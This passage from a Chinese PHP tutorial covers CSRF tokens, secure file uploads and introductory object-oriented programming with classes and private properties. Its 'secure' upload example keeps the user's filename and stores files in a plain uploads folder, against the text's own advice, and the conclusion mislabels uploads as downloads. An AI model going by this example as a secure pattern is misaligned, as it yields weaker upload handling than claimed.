  ;`：显示指示 CSRF 请求无效的错误消息。\n\n简而言之，此代码通过在处理请求前检查随表单提交的反 CSRF 令牌的真实性来确保安全，从而防范 CSRF\
  \ 攻击。如果令牌有效，请求将成功处理；否则将被拒绝。\n\n##### 测试流程\n\n要测试此流程，请在浏览器中访问 `form_csrf.php` 并提交表单。如果反\
  \ CSRF 令牌有效，您应看到“Request processed successfully”消息。如果您尝试在没有令牌或使用无效令牌的情况下提交表单，将看到“Error:\
  \ invalid CSRF request.”消息。如果您尝试直接访问 `csrf_processing.php` 文件，也将收到“Error: invalid\
  \ CSRF request.”消息。\n\n### 安全文件上传\n\n用户文件上传是许多 Web 应用程序的常见功能。然而，如果上传的文件未得到妥善管理，这会带来潜在的安全风险。在本节中，我们将探讨与文件上传相关的风险以及保护此功能的最佳实践。\n\
  \n#### 文件上传相关风险\n\n用户文件上传的主要风险包括：\n\n*   **恶意文件注入**：攻击者可上传包含恶意代码的文件，如 PHP 脚本、恶意软件或可执行文件，以利用服务器漏洞。\n\
  *   **大小溢出**：用户可上传大文件以耗尽存储系统或导致拒绝服务。\n*   **伪造文件扩展名**：攻击者可使用欺骗性扩展名重命名文件，以绕过基于文件扩展名的安全检查。\n\
  *   **安全漏洞**：配置错误或代码漏洞可能被攻击者利用来操纵上传的文件或访问服务器上的敏感文件。\n\n#### 文件验证与清理\n\n以下是安全文件上传的几项最佳实践：\n\
  \n*   **文件类型验证**：通过检查上传文件的扩展名和 MIME 类型来限制允许的文件类型。不要仅信任文件扩展名，因为它很容易被伪造。\n*   **限制文件大小**：为上传文件设置大小限制，以防止过大文件和系统滥用。\n\
  *   **重命名上传文件**：重命名上传文件，赋予其唯一、安全的名称，以避免名称冲突和运行恶意文件的风险。\n*   **安全存储**：将上传文件存储在 Web\
  \ 服务器根目录之外的安全目录中，以限制未授权用户对文件的直接访问。\n*   **杀毒扫描**：使用杀毒扫描工具检查上传文件是否包含恶意软件或危险内容。\n\
  *   **权限管理**：确保上传文件具有适当的权限，以防止未授权访问和安全漏洞。\n\n通过在管理文件上传时实施这些安全实践，您可以有效降低与该功能相关的安全风险，保护应用程序免受潜在攻击。\n\
  \n#### PHP 上传示例\n\n以下是一个处理文件上传并内置安全措施的 PHP 代码示例，您可以将其放在例如 `upload_file.php` 文件中以供测试。\n\
  \n```php\n<?php\n\n// 检查表单是否已提交\nif ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") {\n\
  \    // 检查文件\n    if ($_FILES[\"file\"][\"error\"] == UPLOAD_ERR_OK) {\n       \
  \ // 目标目录路径\n        $uploadDir = \"uploads/\";\n\n        // 文件名\n        $fileName\
  \ = basename($_FILES[\"file\"][\"name\"]);\n\n        // 服务器上的完整文件路径\n        $filePath\
  \ = $uploadDir . $fileName;\n```\n\n\n\n\n<?php\n\n// 获取文件扩展名\n\n$fileExtension\
  \ = strtolower(pathinfo($filePath, PATHINFO_EXTENSION));\n\n// 检查文件 MIME 类型\n\n\
  $fileMimeType = mime_content_type($_FILES[\"file\"][\"tmp_name\"]);\n\n$allowedMimeTypes\
  \ = array('image/jpeg', 'image/png', 'application/pdf');\n\nif (!in_array($fileMimeType,\
  \ $allowedMimeTypes)) {\n\necho \"错误：不允许的文件类型。\";\n\nreturn;\n\n}\n\n// 检查文件扩展名\n\
  \n$allowedExtensions = array('jpg', 'jpeg', 'png', 'pdf');\n\nif (!in_array($fileExtension,\
  \ $allowedExtensions)) {\n\necho \"错误：不允许的文件扩展名。\";\n\nreturn;\n\n}\n\n// 将上传的文件移动到目标目录\n\
  \nif (move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $filePath)) {\n\necho\
  \ \"文件上传成功。\";\n\n} else {\n\necho \"上传文件时出错。\";\n\n}\n\n} else {\n\necho \"错误：\"\
  \ . $_FILES[\"file\"][\"error\"];\n\n}\n\n?>\n\n<!DOCTYPE html>\n\n<html lang=\"\
  fr\">\n\n<head>\n\n<meta charset=\"UTF-8\">\n\n<meta name=\"viewport\" content=\"\
  width=device-width, initial-scale=1.0\">\n\n<title>安全文件上传</title>\n\n</head>\n\n\
  <body>\n\n<h2>安全文件上传</h2>\n\n<form action=\"<?php echo htmlspecialchars($_SERVER[\"\
  PHP_SELF\"]); ?>\" method=\"post\" enctype=\"multipart/form-data\">\n\n<label for=\"\
  file\">选择文件：</label>\n\n<input type=\"file\" id=\"file\" name=\"file\" accept=\"\
  image/jpeg, image/png, application/pdf\">\n\n<button type=\"submit\">上传</button>\n\
  \n</form>\n\n</body>\n\n</html>\n\n这段 PHP 代码确保了向服务器上传文件时的安全性。以下是其详细工作原理：\n\n1. 代码首先使用\
  \ `$_SERVER[\"REQUEST_METHOD\"] == \"POST\"` 检查表单是否已提交，以确保仅在提交表单时才进行处理。\n\n1. 接着，它使用\
  \ `$_FILES[\"file\"][\"error\"] == UPLOAD_ERR_OK` 检查文件上传过程中是否发生了问题。这确保了在进行进一步检查之前，文件已成功上传。\n\
  \n1. 它使用预定义目录和上传文件的名称（通过 `basename($_FILES[\"file\"][\"name\"])` 获取）来确定文件的目标路径。\n\
  \n1. 随后，它使用 `mime_content_type($_FILES[\"file\"][\"tmp_name\"])` 检查上传文件的 MIME 类型，并将其与允许的\
  \ MIME 类型列表（`$allowedMimeTypes`）进行比较。这确保只允许上传指定的文件类型。\n\n请注意，MIME（多用途互联网邮件扩展）类型是一种标准化标识符，用于指定文件中的内容类型。它告诉服务器如何根据文件类型处理文件内容。例如，MIME\
  \ 类型 \"text/html\" 表示该文件是 HTML 文档，而 \"image/jpeg\" 表示它是 JPEG 格式的图像。Web 服务器使用 MIME\
  \ 类型来确定如何将文件内容提供给 Web 浏览器或其他应用程序。\n\n1. 代码还使用 `pathinfo($filePath, PATHINFO_EXTENSION)`\
  \ 检查文件扩展名，并将其与允许的扩展名列表（`$allowedExtensions`）进行比较。这增加了一层额外的安全性，确保上传的文件具有正确的扩展名。\n\
  \n1. 如果 MIME 类型和文件扩展名均有效，则使用 `move_uploaded_file()` 将文件移动到目标目录。否则，将显示相应的错误消息，告知用户上传文件时遇到的任何问题。\n\
  \n1. 最后，显示一个 HTML 表单，允许用户选择并上传文件。该表单通过 POST 方法并以 `enctype=\"multipart/form-data\"\
  ` 将数据发送到当前的 PHP 脚本（`$_SERVER[\"PHP_SELF\"]`），从而实现文件上传。\n\n该代码通过检查上传文件的 MIME 类型和扩展名，确保了文件上传时的安全性增强，从而大大降低了恶意或危险文件被上传到服务器的风险。\n\
  \n#### 结论\n\n本章关于 PHP 安全性的内容强调了保护 Web 应用程序免受各种恶意威胁和攻击的至关重要性。我们深入探讨了安全性的各个方面，首先从\
  \ SQL 注入攻击入手，这代表了对 Web 应用程序最常见且潜在破坏性最大的威胁之一。通过了解攻击者如何利用安全漏洞操纵 SQL 查询并破坏数据库数据，开发人员可以实施预防措施，例如使用预处理语句和绑定参数来防范这些攻击。\n\
  \n我们还研究了跨站脚本攻击（XSS），这是另一种主要威胁，允许攻击者将恶意 JavaScript 代码注入网页，从而危及最终用户的安全。通过使用特殊字符转义和用户输入验证等技术，开发人员可以降低\
  \ XSS 被利用的风险，保护用户免受攻击。\n\n跨站请求伪造（CSRF）也进行了讨论，重点介绍了利用用户信任执行未经授权操作的伪造请求的潜在危险。通过使用反\
  \ CSRF 令牌和验证服务端请求，开发人员可以降低这种风险，并保证用户操作的完整性。\n\n最后，我们研究了与文件下载相关的风险，强调了攻击者可利用的潜在漏洞，以在服务器上执行恶意代码。通过对允许的文件类型施加严格限制、检查\
  \ MIME 签名以及限制下载权限，开发人员可以降低这些漏洞被利用的风险，保护系统完整性。\n\n总之，PHP 安全性是现代 Web 开发的一个基本方面。通过了解各种威胁并在整个开发过程中实施强有力的安全实践，开发人员可以创建安全可靠的\
  \ Web 应用程序，保护用户的敏感数据并保证安全可靠的用户体验。\n\n### 第 E 部分\n\n### PHP 面向对象编程\n\n面向对象编程（OOP）是一种基于对象的创建和操作的基本编程范式。在\
  \ PHP 中，OOP 提供了一种强大的手段来构建和组织代码，实现更高的可重用性、模块化，以及对数据和功能的更高效管理。\n\n过程式编程与面向对象编程（OOP）的区别在于它们对代码构建的根本不同方法。在过程式编程中，程序围绕函数构建，数据通常是直接可访问和可操作的。而在面向对象编程中，代码围绕称为对象的实体进行组织。这些对象封装了数据（称为属性）和作用于这些数据的功能（称为方法）。\n\
  \n重要的是要注意，OOP 本身并非一种新的编程语言，而是一种广泛用于现代应用程序开发的编程范式。这种方法为设计和管理代码提供了更有组织的结构，将其划分为具有特定特征和行为的可重用对象。\n\
  \n至于 PHP，这种流行且灵活的编程语言提供了对 OOP 的原生支持。这使得开发人员能够利用 OOP 概念创建更健壮和可扩展的应用程序。\n\n简而言之，OOP\
  \ 提供了一种组织代码的替代且高效的方式，其中一切皆被视为对象。每个对象都拥有用于存储数据的属性和用于对该数据执行操作的方法。这种方法促进了代码的可重用性、模块化和可维护性，使其成为许多软件开发项目的吸引人之选。\n\
  \n在本部分中，我们将详细探讨 PHP 中 OOP 的基本原则以及良好的开发实践。以下是我们将涵盖主题的概览：\n\n\n\n#### 第 1 章：类和对象\n\
  \n本章通过介绍类和对象的概念，奠定了 PHP 中面向对象编程（OOP）的基础。读者将学习如何定义类、创建对象实例以及访问其属性和方法。\n\n#### 第 2\
  \ 章：封装与数据建模\n\n本章探讨 PHP 中的封装概念，并展示如何使用类来对数据进行建模。\n\n#### 第 3 章：PHP 中的继承\n\n本章探讨\
  \ PHP 中的继承，允许你创建类层级结构以复用和扩展代码。\n\n#### 第 4 章：接口与抽象类\n\n本章介绍 PHP 中的接口和抽象类。你将学习如何使用接口定义契约，以及如何创建抽象类来定义多个类通用的方法。\n\
  \n#### 第 5 章：异常处理\n\n本章涵盖 PHP 中的异常处理，使你能够在应用程序中清晰高效地处理错误和异常情况。\n\n#### 第 6 章：命名空间\n\
  \n本章探讨 PHP 中的命名空间，为你提供一种逻辑构建代码并防止命名冲突的方式。\n\n#### 第 7 章：Traits（特征）\n\n本章介绍 PHP 中的\
  \ Traits，使你能够在不使用多重继承的情况下，在多个类之间复用代码。\n\n#### 第 8 章：魔术方法\n\n本章探讨 PHP 的魔术方法，这些是在\
  \ PHP 中非常有用的特殊方法。\n\n本节深入探讨了 PHP 中的面向对象编程，为开发人员提供了设计和开发健壮、可扩展且易于维护的 PHP 应用程序所需的知识和技能。\n\
  \n### 第 14 章：类和对象\n\n在 PHP 面向对象编程的世界里，类和对象是基本元素，它们使代码能够被高效地构建和组织。类可以被视为创建对象的模型或蓝图，而对象则是类的具体实例，拥有自己的数据（属性）和行为（方法）。\n\
  \n本章将带我们深入 PHP 中类和对象的迷人世界。我们将学习如何定义和创建类、实例化对象、访问其属性和方法，以及管理类成员的可见性。我们还将通过类和对象探讨封装、抽象和代码复用的关键原则。\n\
  \n本章将为你提供掌握类和对象基本概念并有效应用于 PHP 开发项目所需的工具。准备好踏上一段深入 PHP 面向对象编程核心的精彩旅程吧！\n\n#### 定义和创建类\n\
  \n类是 PHP 面向对象编程的基础。类是一种定义对象形式的数据结构。它封装了与特定类型对象相关的数据（属性）和行为（方法）。这里有一个简单的类比来理解面向对象编程中的类是什么：\n\
  \n把类想象成建造汽车的蓝图或模型。在这个模型中，你指定了所有将要建造的汽车共有的特征，例如车门数量、车轮数量、品牌、颜色等。该模型还定义了与汽车相关的方法（如启动、加速、刹车）。\n\
  \n一旦定义了这个类，你就可以创建它的具体实例，就像根据蓝图建造的单个房子一样。`Car` 类的每个实例都是一辆具体的汽车，拥有品牌、型号和颜色等属性的自己的值。\n\
  \n![Image](img/image-170.png)\n\n简而言之，类是定义特定类型对象的结构和行为的模型或蓝图，而实例是该类的具体副本，拥有类中定义的属性的自己的值。\n\
  \n##### 类定义\n\n在 PHP 中，使用 `class` 关键字声明类，后跟类名及其包含在大括号中的属性和方法。\n\n类名必须以字母或下划线（`_`）开头，后跟字母、数字或下划线。\n\
  \n命名约定建议使用 `PascalCase` 表示法来命名类，这意味着类名中的每个单词都以大写字母开头，没有空格或特殊字符。特别是，类名的第一个字母要大写。\n\
  \n以下是定义类的一般语法：\n\n![Image](img/image-171.png)\n\n为了更好地理解这些概念，让我们在服务器上创建一个名为 `phppoo`\
  \ 的目录。如果你在本地使用 XAMPP，可以在 `htdocs` 文件夹中创建此目录。在此目录中，我们将放置本节涵盖的所有概念的说明性示例。\n\n#####\
  \ 类属性\n\n类 **属性** 是在类内部声明的变量。\n\n它们定义了与类的每个实例相关的特征或数据。\n\n命名约定通常建议使用 `camelCase`\
  \ 表示法来命名属性，这意味着第一个单词以小写字母开头，后续单词以大写字母开头。\n\n示例：\n\n```\nclass MyClass {\n\n public\
  \ $myProperty;\n\n private $otherProperty;\n\n}\n```\n\n这段代码在 PHP 中定义了一个名为 `MyClass`\
  \ 的类。在类内部，我们声明了两个属性：`$myProperty` 和 `$otherProperty`。`$myProperty` 属性被声明为 public（公共），意味着可以从类外部访问它。另一方面，`$otherProperty`\
  \ 属性被声明为 private（私有），意味着它只能在类内部访问，无法从外部访问。私有属性用于封装数据，并通过限制直接访问来保证其完整性。\n\n#####\
  \ 类方法\n\n类方法是在类内部声明的函数。\n\n它们定义了与类的每个实例相关的动作或行为。\n\n命名约定通常建议使用 `camelCase` 表示法来命名方法，方式与属性相同。\n\
  \n**示例**：\n\n```\nclass MaClasse {\n\n public function myMethod() {\n\n // 方法体...\n\
  \n }\n\n private function otherMethod() {\n\n // 方法体...\n\n }\n\n}\n```\n\n这段代码在\
  \ PHP 中定义了一个名为 `MaClasse` 的类。在类内部，我们定义了两个方法：`myMethod()` 和 `otherMethod()`。`myMethod()`\
  \ 方法被声明为 public（公共），意味着可以从类外部调用它。另一方面，`otherMethod()` 方法被声明为 private（私有），意味着它只能从类内部调用，且无法从外部访问。私有方法用于封装类的内部逻辑，不打算从类外部直接调用。这使得保护和限制对某些类功能的访问成为可能。\n\
  \n在面向对象编程中，术语“方法”用于指代与类关联的函数，而术语“函数”通常保留给独立的代码块。因此，当我们讨论面向对象编程时，我们用“方法”来描述对象的特定动作或行为，相对于用于更通用、与类无关上下文的“函数”。\n\
  \n##### 实战示例：创建一个类\n\n在主 `phppoo` 目录中，创建两个新文件，分别命名为 `index.php` 和 `Users.php`（确保首字母大写）。然后，在后一个文件中，定义一个名为\
  \ `Users` 的类，同样首字母大写以匹配文件名。\n\n```\n<?php\n\n class Users {\n\n public $name;\n\n\
  \ public $firstname;\n\n public $age;\n\n public $email;\n\n public function logIn()\
  \ {\n\n echo \"I'm a member, so I can connect\";\n\n }\n\n public function logOut()\
  \ {\n\n echo \"I can log out\";\n\n }\n\n }\n\n?>\n```\n\n这段代码定义了一个名为 `Users` 的类，表示具有名称、名字、年龄和电子邮件等多个属性的用户。该类还有两个公共方法：`logIn()`\
  \ 和 `logOut()`。\n\n\n\n\n\n##### “logIn()”方法显示一条消息，表明成员可以登录，而“logOut()”方法显示一条消息，表明用户可以注销。这些方法为管理用户登录和注销提供了特定功能。\n\
  \n##### 对象实例化\n\n一旦定义了类，我们就可以使用 `new` 关键字创建该类的对象（实例）。\n\n![Image](img/image-172.png)\n\
  \n在 `index.php` 文件中添加以下代码：\n\n例如：\n\n```php\n<?php\nrequire_once \"Users.php\";\n\
  $user1 = new Users();\n```\n\n这段 PHP 代码首先通过 `require_once` 引入包含 `Users` 类定义的文件 `Users.php`。接着，它使用关键字\
  \ `new` 创建 `Users` 类的一个新实例，并将该实例赋值给变量 `$user1`。换句话说，它创建了一个“Users”类型的新对象，现在可以访问“Users”类中定义的属性和方法。\n\
  \n##### 对象的写访问\n\n对象的写访问意味着我们可以修改（或赋值）对象属性的值。这允许我们更新存储在对象属性中的数据。\n\n在 `Users` 类的上下文中，我们可以按如下方式对\
  \ `$user1` 对象的属性进行写访问：\n\n```php\n$user1->name = \"Dupont\";\n$user1->firstname\
  \ = \"Eric\";\n$user1->age = 30;\n$user1->email = \"dupont-eric@gmail.com\";\n```\n\
  \n这段代码需集成到已实例化 `$user1` 对象（来自 `Users` 类）的 `index.php` 文件中，用于给 `Users` 类的 `$user1`\
  \ 对象的属性赋值。更具体地说：\n\n*   `$user1->name = \"Dupont\";` 将值 \"Dupont\" 赋给 `$user1` 对象的\
  \ \"name\" 属性。\n*   `$user1->firstname = \"Eric\";` 将值 \"Eric\" 赋给 `$user1` 对象的\
  \ \"firstname\" 属性。\n*   `$user1->age = 30;` 将值 30 赋给 `$user1` 对象的 \"age\" 属性。\n\
  *   `$user1->email = \"dupont-eric@gmail.com\";` 将值 \"dupont-eric@gmail.com\" 赋给\
  \ `$user1` 对象的 \"email\" 属性。\n\n通过赋予这些值，我们初始化了由 `$user1` 对象所代表用户的数据。\n\n##### 对象的读访问\n\
  \n对 `$user1` 对象的读访问意味着我们可以检索其属性值，但不能直接修改它们。这意味着我们可以使用存储在对象属性中的值，但不能直接向这些属性写入新值。\n\
  \n在 `Users` 类的上下文中，如果我们想访问上述实例化的 `$user1` 对象的读属性，可以按如下方式进行：\n\n```php\n// 向 index.php\
  \ 添加的代码\n// 对 $user1 对象属性的读访问\necho \"Name: \" . $user1->name . \"<br>\";\necho\
  \ \"First name: \" . $user1->firstname . \"<br>\";\necho \"Age: \" . $user1->age\
  \ . \"<br>\";\necho \"Email: \" . $user1->email . \"<br>\";\n```\n\n这使我们能够显示 `$user1`\
  \ 对象的属性值。请注意用于调用属性的小箭头 (`->`)。\n\n如果您当前正在运行 `index.php` 文件，显示的结果将类似于以下内容：\n\n![Image](img/image-173.png)\n\
  \n##### 方法访问\n\n方法通过类的对象进行访问。一旦从类创建了对象，您就可以使用箭头符号 (`->`) 调用类的方法。\n\n例如，在已实例化 `$user1`\
  \ 对象的 `index.php` 文件中，我们可以在该对象上调用 `logIn()` 方法。\n\n```php\n$user1->logIn();\n```\n\
  \n这将执行 `logIn()` 方法内部的代码。\n\n![Image](img/image-174.png)\n\n##### 对象私有属性的读访问\n\n\
  对象私有属性的访问是面向对象编程（OOP）中的一个重要概念。让我们按如下方式修改 `Users` 类：\n\n```php\n<?php\nclass Users\
  \ {\n    private $name = \"Dupont\";\n    private $firstname = \"Karine\";\n   \
  \ private $age = 27;\n    private $email = \"dupont-karine@gmail.com\";\n}\n```\n\
  \n在 `Users` 类的这个示例中，我们使用 `private` 关键字定义了四个**私有**属性：`$name`、`$firstname`、`$age`\
  \ 和 `$email`。\n\n`$name`、`$firstname`、`$age` 和 `$email` 属性的初始值分别为 \"Dupont\"、\"\
  Karine\"、27 和 \"dupont-karine@gmail.com\"。这些值在声明属性时赋予。\n\n现在让我们更新 `index.php` 文件，尝试从\
  \ `Users` 类外部访问 `$name`、`$firstname`、`$age` 和 `$email` 属性。以下是 `index.php` 当前的内容：\n\
  \n```php\n<?php\nrequire_once \"Users.php\";\n$user1 = new Users();\n// 对 $user1\
  \ 对象属性的读访问\necho \"Name : \" . $user1->name . \"<br>\";\necho \"First name : \"\
  \ . $user1->firstname . \"<br>\";\necho \"Age : \" . $user1->age . \"<br>\";\necho\
  \ \"Email : \" . $user1->email . \"<br>\";\n```\n\n如果您运行 `index.php`，将会得到以下错误：\n\
  \n![Image](img/image-175.png)\n\n该错误表明我们试图从 `Users` 类外部访问私有属性 (`$name`)，这是不允许的。私有属性只能在声明它们的类内部访问。当我们尝试从另一个上下文（如\
  \ `index.php` 文件）访问它们时，PHP 会生成一个致命错误。那么，如何从定义私有属性的类外部访问这些属性呢？\n\n解决方案在于在类内部创建公共方法，以允许访问这些私有属性。然后，在类外部，可以使用这些公共方法来访问对象的私有属性。这些方法充当中介，提供了一种受控且安全的方式来访问和操作私有属性，同时保持类的封装性。\n\
  \n让我们按如下方式修改 `Users` 类：\n\n```php\n<?php\nclass Users {\n    private $name = \"\
  Dupont\";\n    private $firstname = \"Karine\";\n    private $age = 27;\n    private\
  \ $email = \"dupont-karine@gmail.com\";\n\n    public function getInfosUser() {\n\
  \        echo \"Name: $this->name <br>\";\n        echo \"Firstname: $this->firstname\
  \ <br>\";\n        echo \"Age: $this->age <br>\";\n        echo \"Email additionress:\
  \ $this->email\";\n    }\n}\n```\n\n在 `Users` 类的这个版本中，我们添加了一个名为 `getInfosUser()`\
  \ 的公共方法来显示用户信息。该方法定义在 `Users` 类内部。它使用 `echo` 语句显示当前对象（由 `$this` 表示）的姓、名、年龄和电子邮件地址属性的值。请注意，`$this`\
  \ 变量是 PHP 中一个非常重要的关键字，指代当前正在使用的对象。\n\n在 `getInfosUser()` 方法内部，通过语法 `$this->name`、`$this->firstname`、`$this->age`\
  \ 和 `$this->email` 访问私有属性的值。`->` 运算符用于访问当前对象的属性。\n\n使用 `getInfosUser()` 方法，您可以从\
  \ `Users` 类的实例中检索并显示用户信息。例如，在 `index.php` 中，我们有一个名为 `$user1` 的 `Users` 类实例。您可以在该实例上调用\
  \ `getInfosUser()` 方法以显示该用户的详细信息。\n\n```php\n<?php\nrequire_once \"Users.php\";\n\
  $user1 = new Users();\n// 调用 getInfosuser() 方法\n$user1->getInfosUser();\n```\n\n\
  在这段代码中，引入 `Users.php` 文件并使用 `new` 运算符实例化该类的新对象、将该实例存储在 `$user1` 变量后，在 `$user1` 对象上调用了\
  \ `getInfosUser()` 方法。\n\n执行这段代码的结果将显示用户信息，如姓、名、年龄和电子邮件地址，因为 `getInfosUser()` 方法负责显示这些信息。结果将类似于以下内容：\n\
  \n![Image](img/image-176.png)\n\n简而言之，重要的是要理解，从定义私有属性的类外部访问这些属性，是通过在同一个类中也定义的公共方法来实现的。\n\
  \n##### 对象私有属性的读访问（续）\n\n让我们以 `Users` 类为例，声明私有属性 name、firstname、age 和 email 但不进行初始化。\n\
  \n\n\n\n\n<?php\n\nclass Users {\n\n    private $name;\n\n    private $firstname;\n\
  \n    private $age;\n\n    private $email;\n\n}\n\n如果你现在尝试从类外部直接初始化这些属性，例如从 `index.php`\
  \ 文件，使用以下代码：\n\n```php\n<?php\n\nrequire_once \"Users.php\";\n\n$user1 = new Users();\n\
  \n$user1->name = \"Dupont\";\n\n$user1->firstname = \"Claire\";\n\n$user1->age =\
  \ 32;\n\n$user1->email = \"dupond-claire@gmail.com\";\n```\n\n执行此代码时，将生成一个致命错误，提示不允许从类外部访问私有属性。要解决此错误并允许从类外部对私有属性进行写访问，我们需要在类中提供公共方法，以允许修改这些属性。\n\
  \n在 `Users` 类中，我们创建一个名为 `initialize()` 的新公共方法，例如：\n\n```php\npublic function initialize($lastName,\
  \ $firstName, $age, $email) {\n\n    $this->name = $lastName;\n\n    $this->firstname\
  \ = $firstName;\n\n    $this->age = $age;\n\n    $this->email = $email;\n\n}\n```\n\
  \n在这段代码中，我们创建了一个公共方法，该方法接收用户的姓氏、名字、年龄和电子邮件作为参数，然后将它们赋值给当前对象（`$this`）的相应属性。因此，该方法根据作为参数提供的值初始化对象的私有属性值。我们现在可以使用此方法来访问私有属性\
  \ name、firstname、age 和 email。让我们在 `index.php` 文件中调用此方法：\n\n```php\nrequire_once\
  \ \"Users.php\";\n\n$user1 = new Users();\n\n$user1->initialize(\"Salim\", \"Zakaria\"\
  , 32, \"salim@gmail.com\");\n```\n\n代码执行不会产生错误。要检索由 `initialize()` 方法初始化的姓氏、名字、年龄和电子邮件属性的值，我们也调用\
  \ `getInfosUser()` 方法：\n\n```php\nrequire_once \"Users.php\";\n\n$user1 = new Users();\n\
  \n$user1->initialize(\"Salim\", \"Zakaria\", 32, \"salim@gmail.com\");\n\n$user1->getInfosUser();\n\
  ```\n\n执行此代码将产生以下结果：\n\n![Image](img/image-177.png)\n\n简而言之，私有属性通过充当接口的公共方法来访问，以操作封装在类对象中的数据。这保持了封装性并控制了对私有数据的访问，从而保证了系统的安全性和一致性。\n\
  \n#### 结论\n\n在本章中，我们深入探讨了面向对象编程的基本概念：类和对象。我们学习了如何定义类、从这些类创建对象，以及操作封装在对象内部的数据。\n\n\
  我们还学习了属性和方法的不同类型。这些概念使我们能够创建复杂的数据结构和模块化、可扩展的软件系统。\n\n通过理解面向对象编程的原则，我们能更好地设计健壮、可维护和可扩展的应用程序。通过有效利用类和对象，我们可以以更合乎逻辑和直观的方式组织代码，从而促进项目的开发和维护。\n\
  \n总之，类和对象是 PHP 面向对象编程的基本要素，对于任何希望创建现代、高性能应用程序的 PHP 开发人员来说，掌握它们至关重要。通过继续探索和实践这些概念，我们将成为更称职、更高效的\
  \ PHP 开发人员。\n\n#### 练习\n\n##### 练习 24\n\n编写一个表示城市的类。它应具有名称、省份、大区和人口数量等属性，以及一个显示“城市\
